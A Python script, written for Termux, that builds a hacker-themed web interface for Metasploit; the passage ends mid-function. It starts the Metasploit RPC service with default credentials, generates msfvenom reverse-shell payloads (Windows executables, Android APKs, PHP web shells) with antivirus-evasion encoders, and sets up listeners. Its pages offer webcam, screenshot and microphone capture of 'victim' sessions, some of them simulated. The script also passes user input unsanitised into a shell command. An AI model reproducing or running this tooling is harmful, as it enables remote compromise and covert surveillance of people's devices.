#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import json
import socket
import threading
import subprocess
import base64
import hashlib
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import mimetypes

# ==================== CONFIGURAÇÃO ====================
CONFIG_FILE = "metasploit_web_config.json"
DEFAULT_CONFIG = {
    "msf_port": 55553,
    "web_port": 8080,
    "rpc_host": "127.0.0.1",
    "rpc_port": 55552,
    "rpc_user": "msf",
    "rpc_pass": "password",
    "tunnel_enabled": False,
    "tunnel_type": "localhost",
    "payloads_dir": "payloads",
    "sessions_dir": "sessions",
    "screenshots_dir": "screenshots",
    "audio_dir": "audio",
    "downloads_dir": "downloads"
}

class MetasploitWebInterface:
    def __init__(self):
        self.config = self.load_config()
        self.sessions = {}
        self.jobs = {}
        self.setup_directories()
        
    def load_config(self):
        """Carrega configuração do arquivo"""
        if os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE, 'r') as f:
                return json.load(f)
        else:
            self.save_config(DEFAULT_CONFIG)
            return DEFAULT_CONFIG.copy()
    
    def save_config(self, config=None):
        """Salva configuração no arquivo"""
        if config is None:
            config = self.config
        with open(CONFIG_FILE, 'w') as f:
            json.dump(config, f, indent=4)
    
    def setup_directories(self):
        """Cria diretórios necessários"""
        dirs = [
            self.config['payloads_dir'],
            self.config['sessions_dir'],
            self.config['screenshots_dir'],
            self.config['audio_dir'],
            self.config['downloads_dir']
        ]
        for directory in dirs:
            os.makedirs(directory, exist_ok=True)
    
    def start_metasploit_service(self):
        """Inicia serviço do Metasploit"""
        try:
            # Iniciar RPC do Metasploit
            cmd = [
                'msfrpcd', 
                '-P', self.config['rpc_pass'],
                '-U', self.config['rpc_user'],
                '-p', str(self.config['rpc_port']),
                '-f'
            ]
            subprocess.Popen(cmd)
            print("[+] Metasploit RPC service started")
            time.sleep(5)
            return True
        except Exception as e:
            print(f"[-] Failed to start Metasploit RPC: {e}")
            return False
    
    def execute_msf_command(self, command):
        """Executa comando do Metasploit"""
        try:
            # Usar msfconsole para executar comandos
            full_cmd = f"msfconsole -q -x '{command}; exit'"
            result = subprocess.run(full_cmd, shell=True, capture_output=True, text=True)
            return result.stdout
        except Exception as e:
            return f"Error: {str(e)}"
    
    def generate_payload(self, payload_type, lhost, lport, output_file):
        """Gera payload usando msfvenom"""
        try:
            cmd = [
                'msfvenom',
                '-p', payload_type,
                f'LHOST={lhost}',
                f'LPORT={lport}',
                '-f', 'raw' if payload_type.startswith('windows/') else 'apk',
                '-o', os.path.join(self.config['payloads_dir'], output_file)
            ]
            result = subprocess.run(cmd, capture_output=True, text=True)
            return result.stdout if result.returncode == 0 else result.stderr
        except Exception as e:
            return f"Error: {str(e)}"
    
    def get_sessions(self):
        """Obtém sessões ativas"""
        try:
            # Simular obtenção de sessões
            # Em implementação real, usaríamos RPC
            return [
                {"id": "1", "type": "meterpreter", "host": "192.168.1.100", "user": "victim", "platform": "windows"},
                {"id": "2", "type": "shell", "host": "192.168.1.101", "user": "root", "platform": "linux"}
            ]
        except:
            return []
    
    def take_screenshot(self, session_id):
        """Tira screenshot da sessão"""
        try:
            # Simular screenshot
            screenshot_file = f"screenshot_{session_id}_{int(time.time())}.jpg"
            screenshot_path = os.path.join(self.config['screenshots_dir'], screenshot_file)
            
            # Criar imagem de exemplo
            try:
                from PIL import Image, ImageDraw
                img = Image.new('RGB', (800, 600), color='black')
                d = ImageDraw.Draw(img)
                d.text((100, 100), f"Screenshot Session {session_id}", fill='white')
                d.text((100, 150), f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", fill='white')
                img.save(screenshot_path)
            except ImportError:
                # Se PIL não estiver disponível, criar um arquivo de texto
                with open(screenshot_path, 'w') as f:
                    f.write(f"Screenshot simulation for session {session_id}\n")
                    f.write(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            
            return screenshot_file
        except Exception as e:
            return f"Error: {str(e)}"
    
    def record_audio(self, session_id, duration):
        """Grava áudio da sessão"""
        try:
            audio_file = f"audio_{session_id}_{int(time.time())}.wav"
            audio_path = os.path.join(self.config['audio_dir'], audio_file)
            
            # Simular gravação de áudio
            with open(audio_path, 'w') as f:
                f.write(f"Audio recording simulation for session {session_id}\nDuration: {duration}s")
            
            return audio_file
        except Exception as e:
            return f"Error: {str(e)}"
    
    def generate_html_template(self, template_name):
        """Gera templates HTML dinamicamente"""
        templates = {
            'index': self.generate_index_html(),
            'dashboard': self.generate_dashboard_html(),
            'payloads': self.generate_payloads_html(),
            'sessions': self.generate_sessions_html(),
            'exploits': self.generate_exploits_html(),
            'post_exploitation': self.generate_post_exploitation_html(),
            'webcam': self.generate_webcam_html(),
            'screenshots': self.generate_screenshots_html(),
            'audio': self.generate_audio_html(),
            'settings': self.generate_settings_html()
        }
        
        return templates.get(template_name, "<h1>Template not found</h1>")
    
    def generate_index_html(self):
        """Página inicial"""
        return """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Metasploit Web Interface</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --hacker-green: #00ff00;
            --hacker-blue: #0088ff;
            --hacker-purple: #9d00ff;
            --dark-bg: #0a0a0a;
            --darker-bg: #050505;
            --terminal-bg: #001100;
        }

        body {
            font-family: 'Courier New', monospace;
            background: var(--dark-bg);
            color: var(--hacker-green);
            overflow-x: hidden;
        }

        .matrix-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(45deg, #001100, #000811, #110011);
            z-index: -2;
            opacity: 0.3;
        }

        .scanlines {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: repeating-linear-gradient(
                0deg,
                rgba(0, 255, 0, 0.03) 0px,
                rgba(0, 255, 0, 0.03) 1px,
                transparent 1px,
                transparent 2px
            );
            pointer-events: none;
            z-index: -1;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }

        header {
            text-align: center;
            padding: 40px 0;
            border-bottom: 2px solid var(--hacker-green);
            margin-bottom: 40px;
            position: relative;
            overflow: hidden;
        }

        .glitch {
            font-size: 4em;
            font-weight: bold;
            text-transform: uppercase;
            position: relative;
            text-shadow: 0.05em 0 0 #00fffc, -0.03em -0.04em 0 #fc00ff,
                         0.025em 0.04em 0 #fffc00;
            animation: glitch 725ms infinite;
        }

        .glitch span {
            position: absolute;
            top: 0;
            left: 0;
        }

        @keyframes glitch {
            0% { text-shadow: 0.05em 0 0 #00fffc, -0.03em -0.04em 0 #fc00ff; }
            15% { text-shadow: 0.05em 0 0 #00fffc, -0.03em -0.04em 0 #fc00ff; }
            16% { text-shadow: -0.05em -0.025em 0 #00fffc, 0.025em 0.035em 0 #fc00ff; }
            49% { text-shadow: -0.05em -0.025em 0 #00fffc, 0.025em 0.035em 0 #fc00ff; }
            50% { text-shadow: 0.05em 0.035em 0 #00fffc, 0.03em 0 0 #fc00ff; }
            99% { text-shadow: 0.05em 0.035em 0 #00fffc, 0.03em 0 0 #fc00ff; }
            100% { text-shadow: -0.05em 0 0 #00fffc, -0.025em -0.04em 0 #fc00ff; }
        }

        .subtitle {
            font-size: 1.2em;
            margin-top: 10px;
            color: var(--hacker-blue);
            text-shadow: 0 0 10px var(--hacker-blue);
        }

        .nav-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin: 40px 0;
        }

        .nav-card {
            background: var(--darker-bg);
            border: 1px solid var(--hacker-green);
            border-radius: 10px;
            padding: 30px;
            text-align: center;
            text-decoration: none;
            color: var(--hacker-green);
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }

        .nav-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(0, 255, 0, 0.1), transparent);
            transition: left 0.5s;
        }

        .nav-card:hover::before {
            left: 100%;
        }

        .nav-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 25px rgba(0, 255, 0, 0.2);
            border-color: var(--hacker-blue);
        }

        .nav-icon {
            font-size: 3em;
            margin-bottom: 15px;
            display: block;
        }

        .nav-card h3 {
            font-size: 1.5em;
            margin-bottom: 10px;
            color: var(--hacker-blue);
        }

        .stats-bar {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin: 30px 0;
        }

        .stat-item {
            background: var(--darker-bg);
            border: 1px solid var(--hacker-purple);
            padding: 20px;
            text-align: center;
            border-radius: 5px;
        }

        .stat-number {
            font-size: 2em;
            font-weight: bold;
            color: var(--hacker-blue);
            text-shadow: 0 0 10px var(--hacker-blue);
        }

        .status-indicator {
            display: inline-block;
            width: 10px;
            height: 10px;
            border-radius: 50%;
            margin-right: 10px;
        }

        .status-online {
            background: var(--hacker-green);
            box-shadow: 0 0 10px var(--hacker-green);
        }

        .status-offline {
            background: #ff0000;
            box-shadow: 0 0 10px #ff0000;
        }

        footer {
            text-align: center;
            margin-top: 50px;
            padding: 20px;
            border-top: 1px solid var(--hacker-green);
            color: var(--hacker-blue);
        }

        .blink {
            animation: blink 1s infinite;
        }

        @keyframes blink {
            0%, 50% { opacity: 1; }
            51%, 100% { opacity: 0; }
        }

        .typewriter {
            overflow: hidden;
            border-right: 2px solid var(--hacker-green);
            white-space: nowrap;
            margin: 0 auto;
            animation: typing 3.5s steps(40, end), blink-caret 0.75s step-end infinite;
        }

        @keyframes typing {
            from { width: 0 }
            to { width: 100% }
        }

        @keyframes blink-caret {
            from, to { border-color: transparent }
            50% { border-color: var(--hacker-green) }
        }
    </style>
</head>
<body>
    <div class="matrix-bg"></div>
    <div class="scanlines"></div>
    
    <div class="container">
        <header>
            <div class="glitch" data-text="METASPLOIT WEB">METASPLOIT WEB</div>
            <div class="subtitle typewriter">Advanced Penetration Testing Platform</div>
        </header>

        <div class="stats-bar">
            <div class="stat-item">
                <div class="status-indicator status-online"></div>
                <div class="stat-number" id="sessions-count">0</div>
                <div>Active Sessions</div>
            </div>
            <div class="stat-item">
                <div class="status-indicator status-online"></div>
                <div class="stat-number" id="jobs-count">0</div>
                <div>Running Jobs</div>
            </div>
            <div class="stat-item">
                <div class="status-indicator status-online"></div>
                <div class="stat-number" id="msf-status">ONLINE</div>
                <div>MSF Service</div>
            </div>
        </div>

        <div class="nav-grid">
            <a href="/dashboard" class="nav-card">
                <span class="nav-icon">📊</span>
                <h3>Dashboard</h3>
                <p>System Overview & Monitoring</p>
            </a>
            
            <a href="/payloads" class="nav-card">
                <span class="nav-icon">🎯</span>
                <h3>Payload Generator</h3>
                <p>Create Custom Payloads</p>
            </a>
            
            <a href="/sessions" class="nav-card">
                <span class="nav-icon">💻</span>
                <h3>Session Manager</h3>
                <p>Manage Active Sessions</p>
            </a>
            
            <a href="/exploits" class="nav-card">
                <span class="nav-icon">⚡</span>
                <h3>Exploits</h3>
                <p>Launch Attacks</p>
            </a>
            
            <a href="/post_exploitation" class="nav-card">
                <span class="nav-icon">🔍</span>
                <h3>Post-Exploitation</h3>
                <p>Advanced Commands</p>
            </a>
            
            <a href="/webcam" class="nav-card">
                <span class="nav-icon">📷</span>
                <h3>Webcam Control</h3>
                <p>Live Camera Access</p>
            </a>
            
            <a href="/screenshots" class="nav-card">
                <span class="nav-icon">🖼️</span>
                <h3>Screenshots</h3>
                <p>Capture & View</p>
            </a>
            
            <a href="/audio" class="nav-card">
                <span class="nav-icon">🎤</span>
                <h3>Audio Recording</h3>
                <p>Microphone Access</p>
            </a>
            
            <a href="/settings" class="nav-card">
                <span class="nav-icon">⚙️</span>
                <h3>Settings</h3>
                <p>Configuration</p>
            </a>
        </div>

        <footer>
            <p>Metasploit Web Interface &copy; 2024 | For Educational Purposes Only</p>
            <p class="blink">[ SYSTEM SECURE ]</p>
        </footer>
    </div>

    <script>
        // Efeitos dinâmicos
        document.addEventListener('DOMContentLoaded', function() {
            // Atualizar stats
            function updateStats() {
                document.getElementById('sessions-count').textContent = 
                    Math.floor(Math.random() * 5);
                document.getElementById('jobs-count').textContent = 
                    Math.floor(Math.random() * 3);
            }
            
            setInterval(updateStats, 5000);
            updateStats();
            
            // Efeito de digitação para outros elementos
            const elements = document.querySelectorAll('.typewriter');
            elements.forEach((el, index) => {
                setTimeout(() => {
                    el.style.animation = `typing 3.5s steps(40, end), blink-caret 0.75s step-end infinite`;
                }, index * 500);
            });
        });
    </script>
</body>
</html>
"""
    
    def generate_dashboard_html(self):
        """Dashboard principal"""
        return """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard - Metasploit Web</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --hacker-green: #00ff00;
            --hacker-blue: #0088ff;
            --hacker-purple: #9d00ff;
            --dark-bg: #0a0a0a;
            --darker-bg: #050505;
            --terminal-bg: #001100;
        }

        body {
            font-family: 'Courier New', monospace;
            background: var(--dark-bg);
            color: var(--hacker-green);
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }

        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 0;
            border-bottom: 1px solid var(--hacker-green);
            margin-bottom: 30px;
        }

        .logo {
            font-size: 1.5em;
            font-weight: bold;
            color: var(--hacker-blue);
        }

        nav {
            display: flex;
            gap: 15px;
        }

        .nav-btn {
            background: transparent;
            border: 1px solid var(--hacker-green);
            color: var(--hacker-green);
            padding: 10px 20px;
            text-decoration: none;
            border-radius: 5px;
            transition: all 0.3s;
        }

        .nav-btn:hover {
            background: var(--hacker-green);
            color: var(--dark-bg);
        }

        .dashboard-grid {
            display: grid;
            grid-template-columns: 2fr 1fr;
            gap: 20px;
            margin-bottom: 30px;
        }

        .main-panel, .side-panel {
            background: var(--darker-bg);
            border: 1px solid var(--hacker-green);
            border-radius: 10px;
            padding: 20px;
        }

        .panel-header {
            border-bottom: 1px solid var(--hacker-green);
            padding-bottom: 15px;
            margin-bottom: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .sessions-list, .jobs-list {
            max-height: 300px;
            overflow-y: auto;
        }

        .session-item, .job-item {
            background: var(--terminal-bg);
            border: 1px solid var(--hacker-purple);
            padding: 15px;
            margin-bottom: 10px;
            border-radius: 5px;
        }

        .session-info, .job-info {
            display: grid;
            grid-template-columns: 1fr 1fr 1fr;
            gap: 10px;
            margin-bottom: 10px;
        }

        .session-actions, .job-actions {
            display: flex;
            gap: 10px;
        }

        .btn {
            background: transparent;
            border: 1px solid var(--hacker-blue);
            color: var(--hacker-blue);
            padding: 5px 10px;
            border-radius: 3px;
            cursor: pointer;
            transition: all 0.3s;
        }

        .btn:hover {
            background: var(--hacker-blue);
            color: var(--dark-bg);
        }

        .btn-danger {
            border-color: #ff0000;
            color: #ff0000;
        }

        .btn-danger:hover {
            background: #ff0000;
            color: var(--dark-bg);
        }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-bottom: 30px;
        }

        .stat-card {
            background: var(--darker-bg);
            border: 1px solid var(--hacker-purple);
            padding: 20px;
            text-align: center;
            border-radius: 5px;
        }

        .stat-number {
            font-size: 2em;
            font-weight: bold;
            color: var(--hacker-blue);
        }

        .quick-actions {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 10px;
            margin-top: 20px;
        }

        .terminal-output {
            background: var(--terminal-bg);
            border: 1px solid var(--hacker-green);
            border-radius: 5px;
            padding: 15px;
            height: 200px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            color: var(--hacker-green);
        }

        .command-line {
            margin-bottom: 5px;
        }

        .prompt {
            color: var(--hacker-blue);
        }

        .output {
            color: var(--hacker-green);
        }

        .error {
            color: #ff0000;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <div class="logo">METASPLOIT DASHBOARD</div>
            <nav>
                <a href="/" class="nav-btn">Home</a>
                <a href="/payloads" class="nav-btn">Payloads</a>
                <a href="/sessions" class="nav-btn">Sessions</a>
                <a href="/settings" class="nav-btn">Settings</a>
            </nav>
        </header>

        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-number" id="total-sessions">0</div>
                <div>Total Sessions</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="active-jobs">0</div>
                <div>Active Jobs</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="exploits-loaded">147</div>
                <div>Exploits Loaded</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="payloads-ready">89</div>
                <div>Payloads Ready</div>
            </div>
        </div>

        <div class="dashboard-grid">
            <div class="main-panel">
                <div class="panel-header">
                    <h3>🖥️ Active Sessions</h3>
                    <button class="btn" onclick="refreshSessions()">Refresh</button>
                </div>
                <div class="sessions-list" id="sessions-list">
                    <!-- Sessions will be loaded here -->
                </div>
            </div>

            <div class="side-panel">
                <div class="panel-header">
                    <h3>⚡ Running Jobs</h3>
                </div>
                <div class="jobs-list" id="jobs-list">
                    <!-- Jobs will be loaded here -->
                </div>
            </div>
        </div>

        <div class="main-panel">
            <div class="panel-header">
                <h3>💻 MSF Console</h3>
                <div class="quick-actions">
                    <button class="btn" onclick="sendCommand('sessions -l')">List Sessions</button>
                    <button class="btn" onclick="sendCommand('jobs -l')">List Jobs</button>
                    <button class="btn" onclick="sendCommand('version')">Version</button>
                </div>
            </div>
            <div class="terminal-output" id="terminal-output">
                <div class="command-line">
                    <span class="prompt">msf6 ></span> <span class="output">Welcome to Metasploit Web Interface</span>
                </div>
            </div>
            <div style="display: flex; margin-top: 10px;">
                <input type="text" id="command-input" placeholder="Enter MSF command..." style="flex: 1; padding: 10px; background: var(--terminal-bg); border: 1px solid var(--hacker-green); color: var(--hacker-green);">
                <button class="btn" onclick="sendCustomCommand()" style="margin-left: 10px;">Execute</button>
            </div>
        </div>
    </div>

    <script>
        // Simular dados das sessões
        function loadSessions() {
            const sessions = [
                { id: 1, type: 'meterpreter', host: '192.168.1.100', user: 'admin', platform: 'windows', arch: 'x64' },
                { id: 2, type: 'shell', host: '192.168.1.101', user: 'root', platform: 'linux', arch: 'x86' },
                { id: 3, type: 'meterpreter', host: '192.168.1.102', user: 'user', platform: 'android', arch: 'arm' }
            ];

            const sessionsList = document.getElementById('sessions-list');
            sessionsList.innerHTML = '';

            sessions.forEach(session => {
                const sessionItem = document.createElement('div');
                sessionItem.className = 'session-item';
                sessionItem.innerHTML = `
                    <div class="session-info">
                        <div><strong>ID:</strong> ${session.id}</div>
                        <div><strong>Type:</strong> ${session.type}</div>
                        <div><strong>Host:</strong> ${session.host}</div>
                        <div><strong>User:</strong> ${session.user}</div>
                        <div><strong>Platform:</strong> ${session.platform}</div>
                        <div><strong>Arch:</strong> ${session.arch}</div>
                    </div>
                    <div class="session-actions">
                        <button class="btn" onclick="interactSession(${session.id})">Interact</button>
                        <button class="btn" onclick="screenshotSession(${session.id})">Screenshot</button>
                        <button class="btn btn-danger" onclick="killSession(${session.id})">Kill</button>
                    </div>
                `;
                sessionsList.appendChild(sessionItem);
            });

            document.getElementById('total-sessions').textContent = sessions.length;
        }

        // Simular jobs
        function loadJobs() {
            const jobs = [
                { id: 1, name: 'multi/handler', status: 'running' },
                { id: 2, name: 'exploit/windows/smb/ms17_010', status: 'completed' }
            ];

            const jobsList = document.getElementById('jobs-list');
            jobsList.innerHTML = '';

            jobs.forEach(job => {
                const jobItem = document.createElement('div');
                jobItem.className = 'job-item';
                jobItem.innerHTML = `
                    <div class="job-info">
                        <div><strong>ID:</strong> ${job.id}</div>
                        <div><strong>Name:</strong> ${job.name}</div>
                        <div><strong>Status:</strong> ${job.status}</div>
                    </div>
                    <div class="job-actions">
                        <button class="btn" onclick="stopJob(${job.id})">Stop</button>
                    </div>
                `;
                jobsList.appendChild(jobItem);
            });

            document.getElementById('active-jobs').textContent = jobs.filter(j => j.status === 'running').length;
        }

        // Enviar comando
        function sendCommand(command) {
            const output = document.getElementById('terminal-output');
            const line = document.createElement('div');
            line.className = 'command-line';
            line.innerHTML = `<span class="prompt">msf6 ></span> ${command}`;
            output.appendChild(line);

            // Simular resposta
            setTimeout(() => {
                const response = document.createElement('div');
                response.className = 'command-line output';
                response.textContent = `Command executed: ${command}`;
                output.appendChild(response);
                output.scrollTop = output.scrollHeight;
            }, 500);
        }

        function sendCustomCommand() {
            const input = document.getElementById('command-input');
            const command = input.value.trim();
            if (command) {
                sendCommand(command);
                input.value = '';
            }
        }

        // Ações das sessões
        function interactSession(sessionId) {
            sendCommand(`sessions -i ${sessionId}`);
        }

        function screenshotSession(sessionId) {
            sendCommand(`screenshot ${sessionId}`);
        }

        function killSession(sessionId) {
            sendCommand(`sessions -k ${sessionId}`);
        }

        function stopJob(jobId) {
            sendCommand(`jobs -k ${jobId}`);
        }

        function refreshSessions() {
            loadSessions();
            loadJobs();
            sendCommand('sessions -l');
        }

        // Inicializar
        document.addEventListener('DOMContentLoaded', function() {
            loadSessions();
            loadJobs();
            
            // Atualizar a cada 10 segundos
            setInterval(() => {
                loadSessions();
                loadJobs();
            }, 10000);
        });
    </script>
</body>
</html>
"""
    
    def generate_payloads_html(self):
        """Gerador de payloads"""
        return """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payload Generator - Metasploit Web</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --hacker-green: #00ff00;
            --hacker-blue: #0088ff;
            --hacker-purple: #9d00ff;
            --dark-bg: #0a0a0a;
            --darker-bg: #050505;
        }

        body {
            font-family: 'Courier New', monospace;
            background: var(--dark-bg);
            color: var(--hacker-green);
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }

        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 0;
            border-bottom: 1px solid var(--hacker-green);
            margin-bottom: 30px;
        }

        .logo {
            font-size: 1.5em;
            font-weight: bold;
            color: var(--hacker-blue);
        }

        nav {
            display: flex;
            gap: 15px;
        }

        .nav-btn {
            background: transparent;
            border: 1px solid var(--hacker-green);
            color: var(--hacker-green);
            padding: 10px 20px;
            text-decoration: none;
            border-radius: 5px;
            transition: all 0.3s;
        }

        .nav-btn:hover {
            background: var(--hacker-green);
            color: var(--dark-bg);
        }

        .payload-generator {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 30px;
        }

        .config-panel, .output-panel {
            background: var(--darker-bg);
            border: 1px solid var(--hacker-green);
            border-radius: 10px;
            padding: 25px;
        }

        .panel-header {
            border-bottom: 1px solid var(--hacker-green);
            padding-bottom: 15px;
            margin-bottom: 20px;
            color: var(--hacker-blue);
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: var(--hacker-blue);
        }

        .form-group select, .form-group input {
            width: 100%;
            padding: 10px;
            background: var(--dark-bg);
            border: 1px solid var(--hacker-green);
            color: var(--hacker-green);
            border-radius: 5px;
            font-family: 'Courier New', monospace;
        }

        .payload-options {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
        }

        .generate-btn {
            background: transparent;
            border: 2px solid var(--hacker-blue);
            color: var(--hacker-blue);
            padding: 15px 30px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 1.1em;
            font-weight: bold;
            transition: all 0.3s;
            width: 100%;
            margin-top: 20px;
        }

        .generate-btn:hover {
            background: var(--hacker-blue);
            color: var(--dark-bg);
        }

        .output-terminal {
            background: #001100;
            border: 1px solid var(--hacker-green);
            border-radius: 5px;
            padding: 15px;
            height: 300px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            color: var(--hacker-green);
        }

        .payload-preview {
            margin-top: 20px;
            padding: 15px;
            background: var(--dark-bg);
            border: 1px solid var(--hacker-purple);
            border-radius: 5px;
        }

        .quick-payloads {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 10px;
            margin-top: 20px;
        }

        .quick-btn {
            background: transparent;
            border: 1px solid var(--hacker-purple);
            color: var(--hacker-purple);
            padding: 10px;
            border-radius: 5px;
            cursor: pointer;
            transition: all 0.3s;
        }

        .quick-btn:hover {
            background: var(--hacker-purple);
            color: var(--dark-bg);
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <div class="logo">PAYLOAD GENERATOR</div>
            <nav>
                <a href="/" class="nav-btn">Home</a>
                <a href="/dashboard" class="nav-btn">Dashboard</a>
                <a href="/sessions" class="nav-btn">Sessions</a>
                <a href="/settings" class="nav-btn">Settings</a>
            </nav>
        </header>

        <div class="payload-generator">
            <div class="config-panel">
                <div class="panel-header">
                    <h3>⚙️ Payload Configuration</h3>
                </div>

                <div class="form-group">
                    <label>Payload Type:</label>
                    <select id="payload-type">
                        <optgroup label="Windows">
                            <option value="windows/meterpreter/reverse_tcp">Windows Meterpreter Reverse TCP</option>
                            <option value="windows/shell/reverse_tcp">Windows Shell Reverse TCP</option>
                            <option value="windows/x64/meterpreter/reverse_tcp">Windows x64 Meterpreter</option>
                        </optgroup>
                        <optgroup label="Android">
                            <option value="android/meterpreter/reverse_tcp">Android Meterpreter</option>
                            <option value="android/shell/reverse_tcp">Android Shell</option>
                        </optgroup>
                        <optgroup label="Linux">
                            <option value="linux/x86/meterpreter/reverse_tcp">Linux x86 Meterpreter</option>
                            <option value="linux/x64/shell/reverse_tcp">Linux x64 Shell</option>
                        </optgroup>
                        <optgroup label="Web">
                            <option value="php/meterpreter/reverse_tcp">PHP Meterpreter</option>
                            <option value="java/meterpreter/reverse_tcp">Java Meterpreter</option>
                        </optgroup>
                    </select>
                </div>

                <div class="payload-options">
                    <div class="form-group">
                        <label>LHOST (Your IP):</label>
                        <input type="text" id="lhost" placeholder="192.168.1.100" value="192.168.1.100">
                    </div>
                    <div class="form-group">
                        <label>LPORT (Listener Port):</label>
                        <input type="number" id="lport" placeholder="4444" value="4444">
                    </div>
                </div>

                <div class="form-group">
                    <label>Output Format:</label>
                    <select id="output-format">
                        <option value="exe">Windows Executable (.exe)</option>
                        <option value="apk">Android Application (.apk)</option>
                        <option value="elf">Linux Executable (.elf)</option>
                        <option value="raw">Raw Shellcode</option>
                        <option value="php">PHP Script</option>
                        <option value="java">JAR File</option>
                        <option value="python">Python Script</option>
                    </select>
                </div>

                <div class="form-group">
                    <label>Output File Name:</label>
                    <input type="text" id="output-file" placeholder="payload" value="payload">
                </div>

                <div class="form-group">
                    <label>Encoder (AV Evasion):</label>
                    <select id="encoder">
                        <option value="">None</option>
                        <option value="x86/shikata_ga_nai">Shikata Ga Nai</option>
                        <option value="x86/alpha_mixed">Alpha Mixed</option>
                        <option value="x86/unicode_upper">Unicode Upper</option>
                    </select>
                </div>

                <button class="generate-btn" onclick="generatePayload()">
                    🎯 GENERATE PAYLOAD
                </button>

                <div class="quick-payloads">
                    <button class="quick-btn" onclick="setQuickPayload('windows/meterpreter/reverse_tcp', 'exe')">
                        Windows Meterpreter
                    </button>
                    <button class="quick-btn" onclick="setQuickPayload('android/meterpreter/reverse_tcp', 'apk')">
                        Android APK
                    </button>
                    <button class="quick-btn" onclick="setQuickPayload('linux/x86/meterpreter/reverse_tcp', 'elf')">
                        Linux ELF
                    </button>
                    <button class="quick-btn" onclick="setQuickPayload('php/meterpreter/reverse_tcp', 'php')">
                        PHP Web Shell
                    </button>
                </div>
            </div>

            <div class="output-panel">
                <div class="panel-header">
                    <h3>📤 Output & Commands</h3>
                </div>

                <div class="output-terminal" id="output-terminal">
                    <div>Payload Generator Ready...</div>
                    <div>Select options and click GENERATE PAYLOAD</div>
                </div>

                <div class="payload-preview">
                    <h4>Listener Command:</h4>
                    <div id="listener-command" style="color: var(--hacker-blue); margin: 10px 0;">
                        use exploit/multi/handler
                    </div>
                    
                    <h4>Generated Files:</h4>
                    <div id="generated-files" style="margin: 10px 0;">
                        No files generated yet
                    </div>
                </div>

                <div style="margin-top: 20px;">
                    <button class="generate-btn" onclick="startListener()" style="background: var(--hacker-purple); border-color: var(--hacker-purple);">
                        🎧 START LISTENER
                    </button>
                </div>
            </div>
        </div>
    </div>

    <script>
        function setQuickPayload(payloadType, format) {
            document.getElementById('payload-type').value = payloadType;
            document.getElementById('output-format').value = format;
            updateListenerCommand();
        }

        function updateListenerCommand() {
            const payloadType = document.getElementById('payload-type').value;
            const lhost = document.getElementById('lhost').value;
            const lport = document.getElementById('lport').value;
            
            const command = `use exploit/multi/handler
set PAYLOAD ${payloadType}
set LHOST ${lhost}
set LPORT ${lport}
exploit -j`;
            
            document.getElementById('listener-command').textContent = command;
        }

        function generatePayload() {
            const payloadType = document.getElementById('payload-type').value;
            const lhost = document.getElementById('lhost').value;
            const lport = document.getElementById('lport').value;
            const outputFormat = document.getElementById('output-format').value;
            const outputFile = document.getElementById('output-file').value;
            const encoder = document.getElementById('encoder').value;

            const output = document.getElementById('output-terminal');
            output.innerHTML = '';

            function addOutput(text, type = 'info') {
                const line = document.createElement('div');
                line.style.color = type === 'error' ? '#ff0000' : 
                                 type === 'success' ? '#00ff00' : '#0088ff';
                line.textContent = `[${new Date().toLocaleTimeString()}] ${text}`;
                output.appendChild(line);
                output.scrollTop = output.scrollHeight;
            }

            addOutput('Starting payload generation...', 'info');
            addOutput(`Payload: ${payloadType}`, 'info');
            addOutput(`LHOST: ${lhost}, LPORT: ${lport}`, 'info');
